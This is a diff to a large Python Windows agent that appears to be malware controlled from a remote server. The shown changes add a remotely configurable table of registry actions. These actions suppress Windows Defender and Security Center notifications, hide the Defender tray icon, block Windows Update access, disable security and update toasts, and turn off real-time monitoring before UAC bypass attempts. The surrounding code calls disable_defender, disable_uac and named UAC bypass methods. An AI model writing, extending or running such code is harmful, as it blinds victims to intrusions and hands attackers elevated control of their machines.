@@ -247,6 +247,24 @@ UAC_BYPASS_METHODS_ENABLED = {
     'silentcleanup': True,
     'icmluautil': True
 }
+REGISTRY_ACTIONS = {
+    'policy_push_notifications': True,
+    'policy_windows_update': True,
+    'context_runas_cmd': True,
+    'context_powershell_admin': True,
+    'notify_center_hkcu': True,
+    'notify_center_hklm': True,
+    'defender_ux_suppress': True,
+    'toast_global_above_lock': True,
+    'toast_global_critical_above_lock': True,
+    'toast_windows_update': True,
+    'toast_security_maintenance': True,
+    'toast_windows_security': True,
+    'toast_sec_health_ui': True,
+    'explorer_balloon_tips': True,
+    'explorer_info_tip': True,
+    'disableRealtimeMonitoring': True
+}
 
 # Eventlet is now patched at the very top of the file (line 1-2)
 # This section is kept for compatibility but monkey_patch is already done
@@ -2416,51 +2434,55 @@ def ensure_registry_policies_and_context_menu():
         import winreg
         s = False
         try:
-            k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications")
-            try:
-                v, t = winreg.QueryValueEx(k, "NoToastApplicationNotification")
-                if t != winreg.REG_DWORD or v != 1:
+            if REGISTRY_ACTIONS.get('policy_push_notifications', True):
+                k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications")
+                try:
+                    v, t = winreg.QueryValueEx(k, "NoToastApplicationNotification")
+                    if t != winreg.REG_DWORD or v != 1:
+                        winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, 1)
+                except FileNotFoundError:
                     winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, 1)
-            except FileNotFoundError:
-                winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, 1)
-            winreg.CloseKey(k)
-            s = True
+                winreg.CloseKey(k)
+                s = True
         except Exception as e:
             log_message(f"[REGISTRY] PushNotifications policy failed: {e}", "warning")
         try:
-            k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate")
-            try:
-                v, t = winreg.QueryValueEx(k, "DisableWindowsUpdateAccess")
-                if t != winreg.REG_DWORD or v != 1:
+            if REGISTRY_ACTIONS.get('policy_windows_update', True):
+                k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate")
+                try:
+                    v, t = winreg.QueryValueEx(k, "DisableWindowsUpdateAccess")
+                    if t != winreg.REG_DWORD or v != 1:
+                        winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, 1)
+                except FileNotFoundError:
                     winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, 1)
-            except FileNotFoundError:
-                winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, 1)
-            winreg.CloseKey(k)
-            s = True
+                winreg.CloseKey(k)
+                s = True
         except Exception as e:
             log_message(f"[REGISTRY] WindowsUpdate policy failed: {e}", "warning")
         try:
-            k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
-            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open Command Prompt as Admin")
-            winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "cmd.exe")
-            winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
-            winreg.CloseKey(k)
-            kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
-            winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'cmd.exe /s /k pushd "%V"')
-            winreg.CloseKey(kc)
-            s = True
+            if REGISTRY_ACTIONS.get('context_runas_cmd', True):
+                k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
+                winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open Command Prompt as Admin")
+                winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "cmd.exe")
+                winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(k)
+                kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
+                winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'cmd.exe /s /k pushd "%V"')
+                winreg.CloseKey(kc)
+                s = True
         except Exception as e:
             log_message(f"[REGISTRY] Context menu runas failed: {e}", "warning")
         try:
-            k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
-            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open PowerShell as Admin")
-            winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "powershell.exe")
-            winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
-            winreg.CloseKey(k)
-            kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
-            winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'powershell.exe -NoExit -Command "Set-Location \'%V\'"')
-            winreg.CloseKey(kc)
-            s = True
+            if REGISTRY_ACTIONS.get('context_powershell_admin', True):
+                k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
+                winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open PowerShell as Admin")
+                winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "powershell.exe")
+                winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(k)
+                kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
+                winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'powershell.exe -NoExit -Command "Set-Location \'%V\'"')
+                winreg.CloseKey(kc)
+                s = True
         except Exception as e:
             log_message(f"[REGISTRY] Context menu PowershellAdmin failed: {e}", "warning")
         return s
@@ -2493,28 +2515,29 @@ def suppress_security_notifications_aggressive():
                 success += 1
             except Exception:
                 pass
-        # Current user toasts and policies
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications", "ToastEnabled", 0)
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications", "NoToastApplicationNotification", 1)
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows Defender\UX Configuration", "Notification_Suppress", 1)
-        # Disable Notification Center (policy and explorer)
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter", 1)
-        set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter", 1)
-        # Explorer balloon/info tips
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "EnableBalloonTips", 0)
-        set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowInfoTip", 0)
-        # Windows Defender Security Center notifications and systray
+        if REGISTRY_ACTIONS.get('policy_push_notifications', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications", "ToastEnabled", 0)
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications", "NoToastApplicationNotification", 1)
+        if REGISTRY_ACTIONS.get('defender_ux_suppress', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows Defender\UX Configuration", "Notification_Suppress", 1)
+        if REGISTRY_ACTIONS.get('notify_center_hkcu', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter", 1)
+        if REGISTRY_ACTIONS.get('notify_center_hklm', True):
+            set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter", 1)
+        if REGISTRY_ACTIONS.get('explorer_balloon_tips', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "EnableBalloonTips", 0)
+        if REGISTRY_ACTIONS.get('explorer_info_tip', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowInfoTip", 0)
         set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications", "DisableNotifications", 1)
         set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray", "HideSystray", 1)
-        # Specific toast channels
-        toast_paths = [
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate",
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance",
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsSecurity",
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Microsoft.Windows.SecHealthUI",
-        ]
-        for path in toast_paths:
-            set_dword(winreg.HKEY_CURRENT_USER, path, "Enabled", 0)
+        if REGISTRY_ACTIONS.get('toast_windows_update', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate", "Enabled", 0)
+        if REGISTRY_ACTIONS.get('toast_security_maintenance', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance", "Enabled", 0)
+        if REGISTRY_ACTIONS.get('toast_windows_security', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsSecurity", "Enabled", 0)
+        if REGISTRY_ACTIONS.get('toast_sec_health_ui', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Microsoft.Windows.SecHealthUI", "Enabled", 0)
         log_message(f"[NOTIFICATIONS] Aggressive suppression applied ({success} settings)", "info")
         return success > 0
     except Exception as e:
@@ -2548,7 +2571,8 @@ def keep_trying_elevation():
             disable_uac()
             if DEFENDER_DISABLE_ENABLED:
                 disable_defender()
-            disable_windows_notifications()
+            if REGISTRY_ENABLED:
+                disable_windows_notifications()
             return
         
         retry_count += 1
@@ -2594,7 +2618,8 @@ def attempt_uac_bypass():
     except Exception:
         pass
     try:
-        disable_realtime_monitoring_before_uac()
+        if REGISTRY_ENABLED and REGISTRY_ACTIONS.get('disableRealtimeMonitoring', True):
+            disable_realtime_monitoring_before_uac()
     except Exception:
         pass
     
@@ -9806,7 +9831,7 @@ def on_config_update(data):
         agent = data.get('agent') or {}
         bypasses = data.get('bypasses') or {}
         registry = data.get('registry') or {}
-        global REQUEST_ADMIN_FIRST, MAX_PROMPT_ATTEMPTS, DISABLE_UAC_BYPASS, UAC_BYPASS_DEBUG_MODE, DEFENDER_DISABLE_ENABLED, DISABLE_SLUI_BYPASS, UAC_BYPASS_METHODS_ENABLED, REGISTRY_ENABLED, PERSISTENT_ADMIN_PROMPT_ENABLED
+        global REQUEST_ADMIN_FIRST, MAX_PROMPT_ATTEMPTS, DISABLE_UAC_BYPASS, UAC_BYPASS_DEBUG_MODE, DEFENDER_DISABLE_ENABLED, DISABLE_SLUI_BYPASS, UAC_BYPASS_METHODS_ENABLED, REGISTRY_ENABLED, PERSISTENT_ADMIN_PROMPT_ENABLED, REGISTRY_ACTIONS
         REQUEST_ADMIN_FIRST = bool(agent.get('requestAdminFirst', REQUEST_ADMIN_FIRST))
         try:
             MAX_PROMPT_ATTEMPTS = int(agent.get('maxPromptAttempts', MAX_PROMPT_ATTEMPTS))
@@ -9824,6 +9849,12 @@ def on_config_update(data):
                 UAC_BYPASS_METHODS_ENABLED[k] = bool(methods.get(k))
         if 'slui' in methods:
             DISABLE_SLUI_BYPASS = not bool(methods.get('slui'))
+        actions = registry.get('actions') or {}
+        try:
+            for k, v in actions.items():
+                REGISTRY_ACTIONS[k] = bool(v)
+        except Exception:
+            pass
     except Exception:
         pass
 
@@ -15502,7 +15533,7 @@ if __name__ == "__main__":
         # 3. Disable Windows notifications
         print("\n[STARTUP] Step 3: Disabling Windows notifications...")
         try:
-            if disable_windows_notifications():
+            if REGISTRY_ENABLED and disable_windows_notifications():
                 print("[STARTUP] ✅ Notifications disabled successfully")
             else:
                 print("[STARTUP] ℹ️ Notification disable failed - will retry in background")
